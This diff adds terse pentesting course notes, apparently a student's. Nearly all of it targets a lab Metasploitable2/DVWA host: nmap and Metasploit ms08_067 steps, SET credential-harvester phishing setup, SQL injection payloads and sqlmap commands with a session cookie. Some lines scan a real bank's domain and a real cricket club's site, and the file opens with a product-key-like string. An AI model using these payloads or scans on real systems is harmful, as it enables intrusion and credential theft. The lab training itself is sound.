@@ -1,0 +1,104 @@
+MC60H-DWHD5-H80U9-6V85M-8280D 
+*******************Practical No 2 OSINT - passive************************
+git clone https://github.com/aboul3la/sublist3r.git
+cd sublist3r
+/opt
+sudo git clone https://github.com/aboul3la/sublist3r.git
+cd sublist3r
+ls
+pip install -r requirements.txt
+sudo pip install request
+sudo pip install dnspython
+./sublist3r.py
+sudo ln -sfv /opt/sublist3r/sulist3r.py /u
+sublist3r -v -d kali.org -t 5 -e bing -o~/Desktop/subresult.txt
+
+***********2 Method 
+***nmap***
+nmap -T4 -sS -O 192.168.255.129
+msfconsole
+search ms08_067
+use exploit/windows/smb/ms08_067_netapi
+show option
+*************3 Method
+go to firefox search shodan and go to Shodan Search Engine
+**********4 Method
+Wayback Machine
+******************5 Method
+TinEye
+******************6 Method
+i have be pwned
+
+*******************Practical 3 enum host port services**************************
+Note : open meatasplotable2 login and pass same : msfadmin
+
+sudo nmap -v -p 0-65535 -A 192.168.255.129 -oA metasploitable2
+ls
+cat metasploitable2.nmap
+sudo nmap -sS -O 192.168.255.129
+sudo nmap -sV -O 192.168.255.129
+******Method 2 ********
+legion > host > add hostb > metasploitable2ip enter ako >mode hard/easy
+
+*******************Practical 4 vulnerability scanning and assessment***************************
+**T1 ** use metasploittable2 ip address
+cd /usr/share/nmap/scripts
+ls -la | more
+**T2
+sudo nmap --script-updatedb 
+sudo nmap -sC 192.168.255.129
+cd /usr/share/nmap/scripts
+ls
+nmap --script=ssh-run 192.168.255.129 
+ls | grep http
+nmap --script=http-date 192.168.255.129
+nmap --script=http-trace 192.168.255.129
+
+****Second Method
+sudo apt-get update
+sudo apt install zaproxy 
+*******************Practical No 5 sudo setoolkit************************ 
+sudo setoolkit
+***** password*****
+1
+2
+3
+1
+IP address for the POST back in Harvester/Tabnabbing [192.168.255.129]
+2 or 3
+
+Second attack
+1
+2
+3
+2
+IP address for the POST back in Harvester/Tabnabbing [192.168.255.129]
+Note : Enter the url ex. facebook
+
+**********************Practical 6 Exploiting Web-based app************************************
+**Method 1 -DVWA same as practical 8 do not use cookies part
+
+1=1
+%' or  '1'='1
+%' or 0=0 union select null, user() #
+%' or 0=0 union select null, database() #
+%' or 0=0 union select null, version()#
+
+**Method 2 
+sudo apt update
+sudo apt dist-upgrade
+sudo wafw00f www.hdfcbank.com
+sudo lbd  www.hdfcbank.com
+sudo wpscan --url https://www.durhamcricket.co.uk/
+
+
+**********************Practical 8 SQL injection***************************
+Go to firefox and type ip of metasploitable2
+
+DVWA use this = 1=1
+
+sqlmap -u "http://192.168.255.129/dvwa/vulnerabilities/sqli/?id=1%3D1&Submit=Submit#" --cookie"PHPSESSID=d8e707bdffab32f33c3e4dcc4565595a;security=low"
+
+sqlmap -u "http://192.168.255.129/dvwa/vulnerabilities/sqli/?id=1%3D1&Submit=Submit#" --cookie"PHPSESSID=d8e707bdffab32f33c3e4dcc4565595a;security=low" --dbs
+
+sqlmap -u "http://192.168.255.129/dvwa/vulnerabilities/sqli/?id=1%3D1&Submit=Submit#" --cookie"PHPSESSID=d8e707bdffab32f33c3e4dcc4565595a;security=low" --tables
